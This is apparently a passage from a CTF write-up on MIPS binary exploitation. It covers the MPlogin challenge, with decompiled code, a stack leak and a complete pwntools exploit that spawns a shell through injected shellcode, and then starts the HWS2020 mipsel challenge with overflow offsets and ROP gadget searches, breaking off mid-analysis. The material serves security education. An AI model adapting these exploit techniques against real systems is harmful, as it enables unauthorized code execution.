+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ file Mplogin</span><br><span class="line">Mplogin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"></span><br><span class="line">$ checksec Mplogin</span><br><span class="line">[*] &#x27;/root/Mplogin&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>In <code>main()</code> it gets 2 functions:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $a2</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0</span>, envp);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>, v3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[33m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-----we1c0me t0 MP l0g1n s7stem-----&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">sub_400840</span>();</span><br><span class="line">  <span class="built_in">sub_400978</span>(v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[32m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Now you getshell~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>In <code>sub_400840()</code> it can leak sth on stack because no processing the last byte:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_400840</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">24</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(v1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[34m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username : &quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, v1, <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v1, <span class="string">&quot;admin&quot;</span>, <span class="number">5</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct name : %s&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>In <code>sub_400978()</code> it has an overflow (it can control size of second <code>read()</code>) which lets us write :</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400978</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">20</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">36</span>]; <span class="comment">// [sp+3Ch] [+3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = a1 + <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pre_Password : &quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, v2, <span class="number">36</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password : &quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, v4, v3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v2, <span class="string">&quot;access&quot;</span>, <span class="number">6</span>) || <span class="built_in">strncmp</span>(v4, <span class="string">&quot;0123456789&quot;</span>, <span class="number">10</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Correct password : **********&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>We try to debug dynamically using <code>qemu</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># interactive terminal</span><br><span class="line">$ qemu-mipsel -L ./ -g 1234 ./Mplogin</span><br><span class="line">-----we1c0me t0 MP l0g1n s7stem-----</span><br><span class="line">Username : admin6789012345678901234</span><br><span class="line">Correct name : admin6789012345678901234��@�</span><br><span class="line">                                            @</span><br><span class="line"></span><br><span class="line"># in pwndbg we check stack content</span><br><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ s8 fp sp 0x40800298 ◂— 0x0</span><br><span class="line">01:0004│          0x4080029c —▸ 0x408002b0 ◂— 0x696d6461 (&#x27;admi&#x27;)</span><br><span class="line">02:0008│          0x408002a0 —▸ 0x400d59 ◂— 0x43000000</span><br><span class="line">03:000c│          0x408002a4 ◂— 0x0</span><br><span class="line">04:0010│          0x408002a8 ◂— 0x418e50</span><br><span class="line">05:0014│          0x408002ac ◂— 0x0</span><br><span class="line">06:0018│          0x408002b0 ◂— 0x696d6461 (&#x27;admi&#x27;)</span><br><span class="line">07:001c│          0x408002b4 ◂— 0x3837366e (&#x27;n678&#x27;)</span><br><span class="line">08:0020│          0x408002b8 ◂— 0x32313039 (&#x27;9012&#x27;)</span><br><span class="line">09:0024│          0x408002bc ◂— 0x36353433 (&#x27;3456&#x27;)</span><br><span class="line">0a:0028│          0x408002c0 ◂— 0x30393837 (&#x27;7890&#x27;)</span><br><span class="line">0b:002c│          0x408002c4 ◂— 0x34333231 (&#x27;1234&#x27;)</span><br><span class="line">0c:0030│          0x408002c8 —▸ 0x408002d0 —▸ 0x40007010 ◂— 0x0</span><br><span class="line">0d:0034│          0x408002cc —▸ 0x400b90 (main+164) ◂— lw     $gp, 0x10($fp)</span><br><span class="line">0e:0038│          0x408002d0 —▸ 0x40007010 ◂— 0x0</span><br><span class="line">0f:003c│          0x408002d4 ◂— 0x0</span><br><span class="line">10:0040│          0x408002d8 ◂— 0x2</span><br></pre></td></tr></table></figure>
+<p>So if we send <code>24</code> bytes without <code>\x00</code> at the end, we can leak <code>0x408002d0</code> at <code>0x408002c8</code>(on the stack), and <code>0x408002d0</code> itself is also a stack address.</p>
+<p>Since this challenge with NX disabled, we can write shellcodes to stack and execute, and using ROP to jump back to shellcode address (better the address we leaked, like <code>0x408002d0</code> we already got).</p>
+<p>Here is the exploit:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;Mplogin&#x27;</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">sh = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>])</span><br><span class="line"><span class="comment">#sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack(old fp)</span></span><br><span class="line">sh.sendafter(<span class="string">b&quot;name : &quot;</span>,<span class="string">&quot;admin&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;Correct name : &quot;</span>)</span><br><span class="line">sh.recv(<span class="number">0x18</span>)</span><br><span class="line">stack = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,stack,<span class="built_in">hex</span>(stack),<span class="string">&quot;type:&quot;</span>,<span class="built_in">type</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack overflow</span></span><br><span class="line">sh.sendafter(<span class="string">b&quot;Pre_Password : &quot;</span>,<span class="string">b&quot;access&quot;</span>.ljust(<span class="number">0x14</span>,<span class="string">b&quot;2&quot;</span>)+p32(<span class="number">0x100</span>))</span><br><span class="line">sh.sendafter(<span class="string">b&quot;Password : &quot;</span>,<span class="string">b&quot;0123456789&quot;</span>.ljust(<span class="number">0x28</span>,<span class="string">b&quot;2&quot;</span>)+p32(stack)+asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="HWS2020-pwn-mipsel"><a href="#HWS2020-pwn-mipsel" class="headerlink" title="HWS2020 - pwn - mipsel"></a>HWS2020 - pwn - mipsel</h3><p>Attachment: <a href="/filehost/ampi/pwn">pwn</a><br>Check the file (mips and static)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ file pwn</span><br><span class="line">pwn: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e0782ebdf0d70b808dba4b10c6866faeae35c620, not stripped</span><br><span class="line"></span><br><span class="line">$ checksec pwn</span><br><span class="line">[*] &#x27;/root/pwn&#x27;</span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>In <code>pwn()</code> we find that a <code>0x200</code> v6 reads <code>0x300</code> which triggers overflow,</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// $v0</span></span><br><span class="line">  _BOOL4 result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+0h] [+0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">2</span>]; <span class="comment">// [sp+10h] [+10h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+30h] [+30h]</span></span><br><span class="line">  <span class="keyword">int</span> *v12; <span class="comment">// [sp+34h] [+34h]</span></span><br><span class="line">  <span class="keyword">int</span> *v13; <span class="comment">// [sp+38h] [+38h]</span></span><br><span class="line">  <span class="keyword">int</span> *v14; <span class="comment">// [sp+3Ch] [+3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [sp+40h] [+40h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line">  _BYTE *v17; <span class="comment">// [sp+48h] [+48h]</span></span><br><span class="line">  <span class="keyword">int</span> v18[<span class="number">3</span>]; <span class="comment">// [sp+4Ch] [+4Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the group number: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v18) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v18[<span class="number">0</span>] || v18[<span class="number">0</span>] &gt;= <span class="number">0xA</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fwrite</span>(<span class="string">&quot;The numbers is illegal! Exit...\n&quot;</span>, <span class="number">1</span>, <span class="number">32</span>, stderr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v18[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;v3;</span><br><span class="line">  v9 = <span class="number">36</span>;</span><br><span class="line">  v10 = <span class="number">36</span> * v18[<span class="number">0</span>];</span><br><span class="line">  v11 = <span class="number">36</span> * v18[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">  v12 = v4;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">36</span> * v18[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i &lt; v18[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v18[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v13 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + i * v9);</span><br><span class="line">    v14 = v13;</span><br><span class="line">    <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the id and name, separated by `:`, end with `.` . eg =&gt; &#x27;1:Job.&#x27; &quot;</span>);</span><br><span class="line">    v15 = <span class="built_in">read</span>(<span class="number">0</span>, v6, <span class="number">0x300</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = <span class="built_in">atoi</span>(v6);</span><br><span class="line">      *v14 = v0;</span><br><span class="line">      v16 = <span class="built_in">strchr</span>(v6, <span class="number">58</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; v6++; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v6 == <span class="number">10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v6;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = &amp;v5[-v16];</span><br><span class="line">      <span class="keyword">if</span> ( !v16 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;format error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      v14[<span class="number">1</span>] = <span class="number">1633771776</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>And the <code>memcpy(v14 + 1, v16 + 1, v17);</code> moves heap contents (<code>v16 +1</code>) to stack (<code>v14 + 1</code>) which causes stack overflow.</p>
+<p>Before ROP we have to determine the paddings. Using <code>cyclic</code> doesn’t give a result, while entering <code>a * big num</code> works, due to the logic:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( i &gt;= v18[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// asm as follow</span></span><br><span class="line">   <span class="number">0x400994</span> &lt;pwn+<span class="number">864</span>&gt;    lw     $v1, <span class="number">0x20</span>($fp)</span><br><span class="line">   <span class="number">0x400998</span> &lt;pwn+<span class="number">868</span>&gt;    lw     $v0, <span class="number">0x4c</span>($fp)</span><br><span class="line">   <span class="number">0x40099c</span> &lt;pwn+<span class="number">872</span>&gt;    sltu   $v0, $v1, $v0</span><br><span class="line">   <span class="number">0x4009a0</span> &lt;pwn+<span class="number">876</span>&gt;    bnez   $v0, pwn+<span class="number">376</span>                  &lt;<span class="number">0x4007ac</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>At that time we get <code>$v0</code> &gt; <code>$v1</code> is using <code>cyclic</code></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">V0</span>   <span class="number">0x79616161</span> (<span class="string">&#x27;yaaa&#x27;</span>)    <span class="comment">; from the variable we input in stack</span></span><br><span class="line"><span class="built_in">V1</span>   <span class="number">0x6e616162</span> (<span class="string">&#x27;naab&#x27;</span>)    <span class="comment">; from </span></span><br></pre></td></tr></table></figure>
+<p>Therefore we enter <code>&lt;0x4007ac&gt;</code> to trigger <code>Program received signal SIGSEGV, Segmentation fault.</code> and crash here:</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x4007d4</span> &lt;pwn+<span class="number">416</span>&gt;    <span class="keyword">lw </span>    $<span class="built_in">a0</span>, <span class="number">0x1c</span>($<span class="built_in">fp</span>)</span><br><span class="line">► <span class="number">0x4007d8</span> &lt;pwn+<span class="number">420</span>&gt;    <span class="keyword">lw </span>    $<span class="built_in">v0</span>, -<span class="number">0x7f98</span>($<span class="built_in">gp</span>)</span><br><span class="line">  <span class="number">0x4007dc</span> &lt;pwn+<span class="number">424</span>&gt;    <span class="keyword">move </span>  $<span class="built_in">t9</span>, $<span class="built_in">v0</span></span><br><span class="line">  <span class="number">0x4007e0</span> &lt;pwn+<span class="number">428</span>&gt;    <span class="keyword">bal </span>   memset                        &lt;<span class="number">0x41c0a0</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>While if we use a bunch of <code>a</code>, we can trigger <code>jr $ra</code></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x400a48</span> &lt;pwn+<span class="number">1044</span>&gt;     <span class="keyword">lw </span>    $<span class="built_in">s3</span>, <span class="number">0x64</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">0x400a4c</span> &lt;pwn+<span class="number">1048</span>&gt;     <span class="keyword">lw </span>    $<span class="built_in">s2</span>, <span class="number">0x60</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">0x400a50</span> &lt;pwn+<span class="number">1052</span>&gt;     <span class="keyword">lw </span>    $<span class="built_in">s1</span>, <span class="number">0x5c</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">0x400a54</span> &lt;pwn+<span class="number">1056</span>&gt;     <span class="keyword">lw </span>    $<span class="built_in">s0</span>, <span class="number">0x58</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">0x400a58</span> &lt;pwn+<span class="number">1060</span>&gt;     <span class="keyword">addiu </span> $<span class="built_in">sp</span>, $<span class="built_in">sp</span>, <span class="number">0x80</span></span><br><span class="line">► <span class="number">0x400a5c</span> &lt;pwn+<span class="number">1064</span>&gt;     <span class="keyword">jr </span>    $<span class="built_in">ra</span>                           &lt;<span class="number">0x7a7a7a7a</span>&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x400a60</span> &lt;pwn+<span class="number">1068</span>&gt;     <span class="keyword">nop</span></span><br><span class="line"><span class="keyword"></span>  <span class="number">0x400a64</span> &lt;<span class="keyword">banner&gt; </span>      <span class="keyword">addiu </span> $<span class="built_in">sp</span>, $<span class="built_in">sp</span>, -<span class="number">0x20</span></span><br><span class="line">  <span class="number">0x400a68</span> &lt;<span class="keyword">banner+4&gt; </span>    <span class="keyword">sw </span>    $<span class="built_in">ra</span>, <span class="number">0x1c</span>($<span class="built_in">sp</span>)</span><br></pre></td></tr></table></figure>
+<p>After debugging we get offset as <code>0x90</code>.</p>
+<p>Then think about ROP.<br>On <code>x86</code> arch we can use <code>jmp esp</code> to execute shellcode in stack, whle on <code>mips</code> arch we use similar methods to call stack address.</p>
+<p>Here we use <code>mipsrop</code> in <code>IDA Pro</code>, use <code>mipsrop.stackfinder()</code> to find gadgets jumping back to stack:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x004273C4</span>  |  addiu $a2,$sp,<span class="number">0x70</span>+var_C                            |  jalr  $s0                             |</span><br><span class="line">|  <span class="number">0x0042BCD0</span>  |  addiu $a2,$sp,<span class="number">0x88</span>+var_C                            |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0042FA00</span>  |  addiu $v1,$sp,<span class="number">0x138</span>+var_104                         |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x004491F8</span>  |  addiu $a2,$sp,<span class="number">0x44</span>+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x0044931C</span>  |  addiu $v0,$sp,<span class="number">0x30</span>+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x00449444</span>  |  addiu $a2,$sp,<span class="number">0x44</span>+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x0044AD58</span>  |  addiu $a1,$sp,<span class="number">0x60</span>+var_28                           |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0044AEFC</span>  |  addiu $a1,$sp,<span class="number">0x64</span>+var_28                           |  jalr  $s5                             |</span><br><span class="line">|  <span class="number">0x0044B154</span>  |  addiu $a1,$sp,<span class="number">0x6C</span>+var_38                           |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044B1EC</span>  |  addiu $v0,$sp,<span class="number">0x6C</span>+var_40                           |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044B3EC</span>  |  addiu $v0,$sp,<span class="number">0x170</span>+var_130                         |  jalr  $s0                             |</span><br><span class="line">|  <span class="number">0x00454E94</span>  |  addiu $s7,$sp,<span class="number">0xB8</span>+var_98                           |  jalr  $s3                             |</span><br><span class="line">|  <span class="number">0x00465BEC</span>  |  addiu $a1,$sp,<span class="number">0xC4</span>+var_98                           |  jalr  $s0                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">13</span> matching gadgets</span><br></pre></td></tr></table></figure>
+<p>These gadgets do <code>Action</code> and then jump according to <code>Control Jump</code>.<br>These gadgets can store things on stack to <code>$a1</code>, <code>$a2</code>, <code>$v0</code>, <code>$v1</code> and so on.<br>What we need is some jump to these regs, and the right shellcode layout.<br>Here we use <code>mipsrop.tails()</code> and <code>mipsrop.doubles()</code> to check</p>
